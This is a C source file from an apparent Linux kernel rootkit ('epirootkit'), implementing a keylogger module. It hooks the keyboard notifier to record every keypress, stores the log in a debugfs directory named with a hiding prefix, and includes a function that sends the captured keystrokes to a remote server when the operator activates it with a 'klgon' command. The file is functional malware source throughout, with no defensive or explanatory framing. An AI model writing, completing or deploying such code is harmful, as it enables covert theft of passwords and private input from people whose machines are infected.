#include <linux/debugfs.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/moduleparam.h>

#include "epirootkit.h"
#include "io.h"

// Maximum size for a single character in the keymap
// 12 bytes because of the longest key string (e.g., "_BACKSPACE_")
#define MAX_CHAR_SIZE 12

// Key mapping for US keyboard layout
static const char *keymap[][2] = {
    // keycode: [unshifted, shifted]
    { "\0", "\0" },
    { "_ESC_", "_ESC_" },
    { "1", "!" },
    { "2", "@" },
    { "3", "#" },
    { "4", "$" },
    { "5", "%" },
    { "6", "^" },
    { "7", "&" },
    { "8", "*" },
    { "9", "(" },
    { "0", ")" },
    { "-", "_" },
    { "=", "+" },
    { "_BACKSPACE_", "_BACKSPACE_" },
    { "_TAB_", "_TAB_" },
    { "q", "Q" },
    { "w", "W" },
    { "e", "E" },
    { "r", "R" },
    { "t", "T" },
    { "y", "Y" },
    { "u", "U" },
    { "i", "I" },
    { "o", "O" },
    { "p", "P" },
    { "[", "{" },
    { "]", "}" },
    { "\n", "\n" },
    { "_LCTRL_", "_LCTRL_" },
    { "a", "A" },
    { "s", "S" },
    { "d", "D" },
    { "f", "F" },
    { "g", "G" },
    { "h", "H" },
    { "j", "J" },
    { "k", "K" },
    { "l", "L" },
    { ";", ":" },
    { "'", "\"" },
    { "`", "~" },
    { "_LSHIFT_", "_LSHIFT_" },
    { "\\", "|" },
    { "z", "Z" },
    { "x", "X" },
    { "c", "C" },
    { "v", "V" },
    { "b", "B" },
    { "n", "N" },
    { "m", "M" },
    { ",", "<" },
    { ".", ">" },
    { "/", "?" },
    { "_RSHIFT_", "_RSHIFT_" },
    { "_PRTSCR_", "_KPD*_" },
    { "_LALT_", "_LALT_" },
    { " ", " " },
    { "_CAPS_", "_CAPS_" },
    { "F1", "F1" },
    { "F2", "F2" },
    { "F3", "F3" },
    { "F4", "F4" },
    { "F5", "F5" },
    { "F6", "F6" },
    { "F7", "F7" },
    { "F8", "F8" },
    { "F9", "F9" },
    { "F10", "F10" },
    { "_NUM_", "_NUM_" },
    { "_SCROLL_", "_SCROLL_" },
    { "_KPD7_", "_HOME_" },
    { "_KPD8_", "_UP_" },
    { "_KPD9_", "_PGUP_" },
    { "-", "-" },
    { "_KPD4_", "_LEFT_" },
    { "_KPD5_", "_KPD5_" },
    { "_KPD6_", "_RIGHT_" },
    { "+", "+" },
    { "_KPD1_", "_END_" },
    { "_KPD2_", "_DOWN_" },
    { "_KPD3_", "_PGDN" },
    { "_KPD0_", "_INS_" },
    { "_KPD._", "_DEL_" },
    { "_SYSRQ_", "_SYSRQ_" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "F11", "F11" },
    { "F12", "F12" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "_KPENTER_", "_KPENTER_" },
    { "_RCTRL_", "_RCTRL_" },
    { "/", "/" },
    { "_PRTSCR_", "_PRTSCR_" },
    { "_RALT_", "_RALT_" },
    { "\0", "\0" },
    { "_HOME_", "_HOME_" },
    { "_UP_", "_UP_" },
    { "_PGUP_", "_PGUP_" },
    { "_LEFT_", "_LEFT_" },
    { "_RIGHT_", "_RIGHT_" },
    { "_END_", "_END_" },
    { "_DOWN_", "_DOWN_" },
    { "_PGDN", "_PGDN" },
    { "_INS_", "_INS_" },
    { "_DEL_", "_DEL_" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "\0", "\0" },
    { "_PAUSE_", "_PAUSE_" }
};

// Module state
static bool is_running = false;

// Debugfs structures
static struct dentry *file;
static struct dentry *subdir;

// Keylog buffer structure
struct keylog_buffer {
    size_t pos;
    size_t size;
    char *buf;
};

static struct keylog_buffer keylog_buf = {
    .pos = 0,
    .size = 0,
    .buf = NULL,
};

/**
 * File read handler for debugfs file.
 *
 * @param filp   Pointer to the file structure.
 * @param buffer Buffer to copy data to user space.
 * @param len    Number of bytes to read.
 * @param offset Pointer to the file offset.
 * @return Number of bytes read on success, negative error code on failure.
 */
static ssize_t keys_read(struct file *filp, char *buffer, size_t len,
                         loff_t *offset) {
    return simple_read_from_buffer(buffer, len, offset, keylog_buf.buf,
                                   keylog_buf.pos);
}

const struct file_operations keys_fops = {
    .owner = THIS_MODULE,
    .read = keys_read,
};

/**
 * Converts a keycode and shift state to a readable key string.
 * 
 * @param keycode    The keycode to convert.
 * @param shift_mask Non-zero if the shift key is pressed, zero otherwise.
 * @param buf        Buffer to store the resulting key string.
 */
static void keycode_to_string(int keycode, int shift_mask, char *buf) {
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
        const char *key = shift_mask ? keymap[keycode][1] : keymap[keycode][0];
        snprintf(buf, MAX_CHAR_SIZE, "%s", key);
    }
}

 
/**
 * Keyboard notifier callback function.
 * 
 * @param nblock Pointer to the notifier block structure.
 * @param code   The action/event type (e.g., key press, key release).
 * @param _param Pointer to event-specific data.
 * @return       NOTIFY_OK or appropriate notifier return value.
 */
static int epikeylog_callback(struct notifier_block *nblock, unsigned long code,
                              void *_param) {
    size_t len;
    char keybuf[MAX_CHAR_SIZE] = { 0 };
    struct keyboard_notifier_param *param = _param;

    // Only process key presses
    if (!param->down)
        return NOTIFY_OK;

    keycode_to_string(param->value, param->shift, keybuf);
    len = strlen(keybuf);
    if (len < 1)
        return NOTIFY_OK;

    // Resize buffer if necessary
    if (keylog_buf.pos + len >= keylog_buf.size) {
        size_t new_size = keylog_buf.size + STD_BUFFER_SIZE;
        char *new_buf = krealloc(keylog_buf.buf, new_size, GFP_KERNEL);
        if (!new_buf) {
            ERR_MSG("epikeylog_callback: memory reallocation failed\n");
            return NOTIFY_BAD;
        }
        keylog_buf.buf = new_buf;
        keylog_buf.size = new_size;
    }

    strncpy(keylog_buf.buf + keylog_buf.pos, keybuf, len);
    keylog_buf.pos += len;

    pr_debug("%s\n", keybuf);
    return NOTIFY_OK;
}

// Notifier block for keyboard events
static struct notifier_block epikeylog_blk = {
    .notifier_call = epikeylog_callback,
};

/**
 * @file epikeylog.c
 * @brief Handles sending the keylogger buffer content to the remote server.
 */
int epikeylog_send_to_server(void) {
    if (!is_running) {
        DBG_MSG("epikeylog_send_to_server: not running\n");
        send_to_server(
            TCP,
            "epikeylog_send_to_server: not running. Activate it with `klgon`.\n");
        return -EBUSY;
    }

    char *full_cmd = kzalloc(PATH_MAX, GFP_KERNEL);
    if (!full_cmd) {
        ERR_MSG("epikeylog_send_to_server: command memory allocation failed\n");
        return -ENOMEM;
    }

    snprintf(full_cmd, PATH_MAX, "cat /sys/kernel/debug/%sklg/keys",
             HIDDEN_PREFIX);
    exec_str_as_command(full_cmd, true);

    char *keys_content;
    int readed_size = _read_file(STDOUT_FILE, &keys_content);
    int ret_code = send_to_server_raw(keys_content, readed_size);

    DBG_MSG("epikeylog_send_to_server: keylogger content sent\n");

    kfree(full_cmd);
    kfree(keys_content);

    return ret_code;
}

/**
 * Prepares the debugfs structures for the keylogger.
 * @return 0 on success, negative error code on failure.
 */
static int prepare_dbgfs(void) {
    char *dir_name = kzalloc(PATH_MAX, GFP_KERNEL);
    if (!dir_name) {
        ERR_MSG("prepare_dbgfs: directory name allocation failed\n");
        return -ENOMEM;
    }

    snprintf(dir_name, PATH_MAX, "%s%s", HIDDEN_PREFIX, "klg");
    subdir = debugfs_create_dir(dir_name, NULL);
    kfree(dir_name);

    if (IS_ERR(subdir) || !subdir) {
        ERR_MSG("prepare_dbgfs: failed to create debugfs directory\n");
        return PTR_ERR(subdir);
    }

    file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
    if (!file) {
        ERR_MSG("prepare_dbgfs: failed to create debugfs file\n");
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }

    return SUCCESS;
}

/**
 * Cleans up the debugfs structures.
 */
static void clean_dbgfs(void) {
    if (file) {
        debugfs_remove(file);
        file = NULL;
    }

    if (subdir) {
        debugfs_remove_recursive(subdir);
        subdir = NULL;
    }
}

/**
 * Initializes the keylogger module.
 * @return 0 on success, negative error code on failure.
 */
int epikeylog_init() {
    DBG_MSG("epikeylog_init: initializing keylogger\n");

    if (is_running) {
        DBG_MSG("epikeylog_init: already running\n");
        return SUCCESS;
    }

    if (prepare_dbgfs() < 0) {
        ERR_MSG("epikeylog_init: debugfs preparation failed\n");
        return -ENOENT;
    }

    keylog_buf.pos = 0;
    keylog_buf.size = STD_BUFFER_SIZE;
    keylog_buf.buf = kzalloc(keylog_buf.size, GFP_KERNEL);
    if (!keylog_buf.buf) {
        ERR_MSG("epikeylog_init: keylog buffer allocation failed\n");
        clean_dbgfs();
        return -ENOMEM;
    }

    if (register_keyboard_notifier(&epikeylog_blk) != 0) {
        ERR_MSG("epikeylog_init: keyboard notifier registration failed\n");
        clean_dbgfs();
        return -EIO;
    }

    is_running = true;
    DBG_MSG("epikeylog_init: keylogger initialized\n");

    return SUCCESS;
}

/**
 * Exits the keylogger module, unregisters the notifier, and cleans up.
 * @return 0 on success, negative error code on failure.
 */
int epikeylog_exit(void) {
    if (!is_running) {
        DBG_MSG("epikeylog_exit: already stopped\n");
        return SUCCESS;
    }

    if (unregister_keyboard_notifier(&epikeylog_blk) != 0) {
        ERR_MSG("epikeylog_exit: failed to unregister keyboard notifier\n");
        return -EIO;
    }

    if (!subdir || IS_ERR(subdir)) {
        ERR_MSG("epikeylog_exit: debugfs directory invalid\n");
        return -EIO;
    }

    clean_dbgfs();

    if (keylog_buf.buf) {
        kfree(keylog_buf.buf);
        keylog_buf.buf = NULL;
    }

    keylog_buf.pos = 0;
    keylog_buf.size = 0;

    is_running = false;
    DBG_MSG("epikeylog_exit: keylogger stopped\n");

    return SUCCESS;
}
